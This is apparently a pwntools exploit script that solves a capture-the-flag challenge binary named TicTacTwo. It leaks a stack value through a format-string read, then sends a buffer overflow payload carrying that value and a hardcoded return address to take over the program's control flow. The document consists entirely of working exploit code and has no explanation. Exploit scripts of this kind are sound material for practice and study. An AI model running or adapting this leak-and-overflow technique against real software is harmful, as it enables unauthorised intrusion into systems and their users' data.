from pwn import *

proc = process('./TicTacTwo')

payload = b'A' * 14

proc.recvline_contains(b'Player')
proc.sendline('%11$x')
s = str(proc.recvline().split(b'at position ')[1].split(b'?')[0])
s = s[2:-1]
s = int(s, 16).to_bytes(4, byteorder='little')
payload += s 
payload += b'B'*12
payload += (0x56556842).to_bytes(4, byteorder='little')
payload += b'C'*4
payload += b'X'

print(payload)
proc.sendline('n')
proc.sendline(payload)
print(proc.recvline())
proc.sendline('y')
print(proc.recvline())
proc.sendline('1')
print(proc.recvline())
proc.sendline('y')
proc.recvline()
